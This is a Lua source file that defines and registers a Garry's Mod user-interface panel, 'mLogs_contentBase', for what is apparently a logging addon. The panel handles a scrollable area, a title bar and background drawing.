   local PANEL = {}  AccessorFunc(PANEL, "m_HelpText", "HelpText")  function PANEL:Init() 	self.scroll = self:Add("mLogs_scrollPanel") 	 	self.title = self.scroll:Add("DPanel") 	self.title.Paint = function(s,w,h) 		draw.SimpleText(self.titleText or "", "mLogs_large", w*0.01, h*0.5, color_white, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER) 		draw.RoundedBox(0,0,h-2,w,2,mLogs.config.colors.border) 	end 	 	self.yPos = 0 	self.ySpacingMul = 0.02   	self.pM = 0.98   end  function PANEL:SetTitleVisible(bool) 	self.title:SetVisible(bool) end  function PANEL:SetTitle(txt) 	self.titleText = txt 	self:InvalidateLayout() end  function PANEL:Paint(w,h) 	if(!mLogs.config.blur.bg)then 		draw.RoundedBox(0,0,0,w,h,mLogs.config.colors.bg) 	end end  function PANEL:PerformLayout(w,h) 	self.scroll:SetSize(w,h) 	 	self.ySpacing = h*self.ySpacingMul 	self.yPos = 0  	if(self.title:IsVisible())then 		self.yPos = h*0.1 		 		self.title:SetPos(w*0.2,0) 		self.title:SetSize(w*0.8,self.yPos) 	end end vgui.Register( "mLogs_contentBase", PANEL, "DPanel" ) 